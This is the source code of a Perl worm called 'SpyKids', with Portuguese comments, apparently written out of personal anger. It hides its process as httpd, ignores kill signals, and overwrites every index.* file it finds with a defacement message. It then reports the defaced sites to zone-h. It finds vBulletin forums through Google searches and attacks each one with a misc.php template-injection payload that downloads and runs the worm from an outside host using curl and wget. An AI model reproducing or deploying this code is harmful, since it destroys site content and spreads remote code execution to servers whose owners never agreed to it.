   #!/usr/bin/perl

   #####################
   ####
   ####  ####    ####    ####    ####    ####   ####   #    #    #    #   ####
   ####  #    #    #    #    #          #   #     #         #         #    #    #  #     #
   ####  ####    #    #    ###      ##        ####   #         ####    ##       ###
   ####  #          #    #    #          # #            #    #         #    #    #  #     #
   ####  #          ####    ####    #   #    ####    ####   #    #    #   #    ####
   ####
   #####################
   #
   #  Desenvolvi este worm
   #  porque briguei com a
   #  namorada e eu tinha
   # que descontar a raiva
   # em alguem, me desculpe
   # se esse alguém é Você
   #
   #####################



   use IO::Socket::INET;
   $hahaha = $0;
   my $processo = "/usr/local/sbin/httpd";
   $SIG{"INT"} = "IGNORE";
   $SIG{"HUP"} = "IGNORE";
   $SIG{"TERM"} = "IGNORE";
   $SIG{"CHLD"} = "IGNORE";
   $SIG{"PS"} = "IGNORE";

   $0="$processo"."\0"x16;
   my $pid=fork;
   exit if $pid;

   ########################
   #                                           #
   #  procura index                  #
   #                                          #
   #######################

   system("locate index.* >> index");
   system("find / -name index.* >> index");

   open(a,"<index");
   @ind = <a>;
   close(a);
   $b = scalar(@ind);
   for($a=0;$a<=$b;$a++){
   chomp $ind[$a];
   system("echo spykids ownz your server > $ind[$a]");
   }


   #########################
   #                                              #
   # pega sites e registra           #
   #                                             #
   #########################

   `cat /etc/httpd/conf/httpd.conf |grep ServerName >> sites`;


   open(a,"<sites");
   @site = <a>;
   close(a);

   $b = scalar(@site);

   for($a=0;$a<=$b;$a++)
   {
   $site[$a] =~ s/#//g;
   $site[$a] =~ s/servername//g;
   $site[$a] =~ s/ServerName//g;
   $site[$a] =~ s/ //g;
   $testa = IO::Socket::INET->new(PeerAddr => $site[$a], PeerPort => 80, Proto => "tcp") or next;
   print $testa "GET / HTTP/1.0\n\n";
   print $testa "Host: $site";
   print $testa "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0";
   print $testa "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1";
   print $testa "Accept-Language: pt-br, pt;q=0.50";
   print $testa "Accept-Encoding: gzip, deflate, compress;q=0.9";
   print $testa "Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66";
   print $testa "Keep-Alive: 300";
   print $testa "Connection: keep-alive";
   @ow = <$testa>;
   close($teste);
   $ae = "@ow";
   if($ae =~/spykids/i){
   $sock = IO::Socket::INET->new(PeerAddr => "www.zone-h.org", PeerPort => 80, Proto => "tcp") or die "nao conectou";
   print $sock "POST /en/defacements/notify HTTP/1.0\r\n";
   print $sock "Accept: */*\r\n";
   print $sock "Referer: http://www.zone-h.org/en/defacements/notify\r\n";
   print $sock "Accept-Language: pt-br\r\n";
   print $sock "Content-Type: application/x-www-form-urlencoded\r\n";
   print $sock "Connection: Keep-Alive\r\n";
   print $sock "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n";
   print $sock "Host: www.zone-h.org\r\n";
   print $sock "Content-Length: 385\r\n";
   print $sock "Pragma: no-cache\r\n";
   print $sock "\r\n";
   print $sock "notify_defacer=SpyKids&notify_domain=http%3A%2F%2F$site[$a]&notify_hackmode=18&notify_reason=5&notify=+OK+\r\n";

   close($sock);
   }
   }


   #########################
   #                                              #
   #  worm aws.spykids              #
   #                                             #
   ########################
   while(1){
   $cmd = '/misc.php?do=page&template={${system(%22cd%20/tmp;curl%20-O%20http://compras.el-nacional.com/spykids.txt%20;perl%20spykids.txt%20;rm%20-rf%20spykids*;%20wget%20http://compras.el-nacional.com/spykids.txt;%20perl%20spykids.txt;%20rm%20-rf%20%20spykids*%22)}}';




   @site = "";
   $a=0;
   @dom = (".ar",".au",".aw",".ax",".az",".ba",".bb",".bd",".be",".bf",".bg",".bh",".bi",".bj",".bm",".bn",".bo",".br",".bs",".bt",".bv",".bw",".by",".bz",".ca",".cc",".cd",".cf",".cg",".ch",".ci",".ck",".cl",".cm",".cn",".co",".cr",".cs",".cu",".cv",".cx",".cy",".cz",".de",".dj",".dk",".dm",".do",".dz",".ec",".ee",".eg",".eh",".er",".es",".et",".fi",".fj",".fk",".fm",".fo",".fr",".ga",".gb",".gd",".ge",".gf",".gg",".gh",".gi",".gl",".gm",".gn",".gp",".gq",".gr",".gs",".gt",".gu",".gw",".gy",".hk",".hm",".hn",".hr",".ht",".hu",".id",".ie",".il",".im",".in",".io",".iq",".ir",".is",".it",".je",".jm",".jo",".jp",".ke",".kg",".kh",".ki",".km",".kn",".kp",".kr",".kw",".ky",".kz",".la",".lb",".lc",".li",".lk",".lr",".ls",".lt",".lu",".lv",".ly",".ma",".mc",".md",".mg",".mh",".mk",".ml",".mm",".mn",".mo",".mp",".mq",".mr",".ms",".mt",".mu",".mv",".mw",".mx",".my",".mz",".na",".nc",".ne",".nf",".ng",".ni",".nl",".no",".np",".nr",".nu",".nz",".om",".pa",".pe",".pf",".pg",".ph",".pk",".pl",".pm",".pn",".pr",".ps",".pt",".pw",".py",".qa",".re",".ro",".ru",".rw",".sa",".sb",".sc",".sd",".se",".sg",".sh",".si",".sj",".sk",".sl",".sm",".sn",".so",".sr",".st",".sv",".sy",".sz",".tc",".td",".tf",".tg",".th",".tj",".tk",".tl",".tm",".tn",".to",".tp",".tr",".tt",".tv",".tw",".tz",".ua",".ug",".uk",".um",".us",".uy",".uz",".va",".vc",".ve",".vg",".vi",".vn",".vu",".wf",".ws",".ye",".yt",".yu",".za",".zm",".zw");
   foreach $dom (@dom){
   $site = "www.google.com";
   open(a,">pra.txt");
   print a "";
   close(a);
   ############### google

   for($n=0;$n<1000;$n += 100){
   $sock = IO::Socket::INET->new(PeerAddr=>"$site",PeerPort=>"80",Proto=>"tcp") or next;
   print $sock "GET h/search?q=%22Powered+by%3A+vBulletin%22inurl%3A$dom&num=100&hl=en&lr=&as_qdr=all&start=$n&sa=N HTTP/1.0\n\n";
   print $sock "Host: www.google.com";
   print $sock "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0";
   print $sock "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1";
   print $sock "Accept-Language: pt-br, pt;q=0.50";
   print $sock "Accept-Encoding: gzip, deflate, compress;q=0.9";
   print $sock "Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66";
   print $sock "Keep-Alive: 300";
   print $sock "Connection: keep-alive";
   @resu = <$sock>;
   close($sock);
   $ae = "@resu";
   while ($ae=~ m/<a href=.*?>.*?<\/a>/){
   $ae=~ s/<a href=(.*?)>.*?<\/a>/$1/;
   $uber=$1;
   if ($uber !~/translate/)
      {
       if ($uber !~ /cache/)
   {
   if ($uber !~ /"/)
   {
    if ($uber !~ /google/)
    {
    if ($uber !~ /216/)
    {
    if ($uber =~/http/)
    {

     substr($uber,0,7) = "";
     $nu = rindex $uber, '/';
     $uber = substr($uber,0,$nu);


     open(a,">>pra.txt");
     print a "$uber\n";
     close(a);

   }}}}}}
   }
   }
   $ark = "pra.txt";
   @si = "";
   open (arquivo,"<$ark");
   @si = <arquivo>;
   close(arquivo);
   $novo ="";
   foreach (@si){
   if (!$si{$_})
   {
   $novo .= $_;
   $si{$_} = 1;
   }
   }
   open (arquivo,">$ark");
   print arquivo $novo;
   close(arquivo);
   open(a,"<pra.txt");
   @site = <a>;
   close(a);

   foreach $site (@site){
   chomp $site;

   ($site, $dir) = split('/',$site);


   $soc = IO::Socket::INET->new(PeerAddr => $site, PeerPort => 80, Proto => "tcp") or next;
   print $soc "GET /$dir$cmd HTTP/1.0\n\n";
   print $soc "Host: $site";
   print $soc "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0";
   print $soc "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1";
   print $soc "Accept-Language: pt-br, pt;q=0.50";
   print $soc "Accept-Encoding: gzip, deflate, compress;q=0.9";
   print $soc "Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66";
   print $soc "Keep-Alive: 300";
   print $soc "Connection: keep-alive";
   close($soc);

   }
   }
   }
